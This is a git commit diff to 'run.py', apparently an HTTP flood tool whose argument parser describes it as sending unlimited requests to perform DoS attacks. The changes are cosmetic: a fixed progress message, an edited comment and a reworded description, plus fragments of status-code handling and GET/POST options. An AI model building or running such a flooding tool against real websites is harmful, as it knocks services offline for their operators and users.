76750e925831b961e09ac2c2cbcd4a56d0f7d7cf
kunkaffa <kunkaffa3@gmail.com>
2025-08-30 20:28:25 +0700

    Update run.py

--- run.py
+++ run.py
@@ -83,9 +83,8 @@ def initHeaders():
 
 def handleStatusCodes(status_code):
 	global request_counter
-	sys.stdout.write
-	        print("\r%i \033[31mATTACK REQUEST SENT \033[33mB A S E - L7\033[0m" % request_counter)
-    sys.stdout.flush()
+	sys.stdout.write("\r%i requests has been sent" % request_counter)
+	sys.stdout.flush()
 	if status_code == 429:
 			printMsg("You have been throttled")
 	if status_code == 500:
@@ -134,11 +133,11 @@ class SendPOSTThread(threading.Thread):
 			pass
 
 
-# TODO:
+# 
 # check if the site stop responding and alert
 
 def main(argv):
-	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DDoS attacks. Basel7')
+	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. BaseL7')
 	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
 	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
 	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
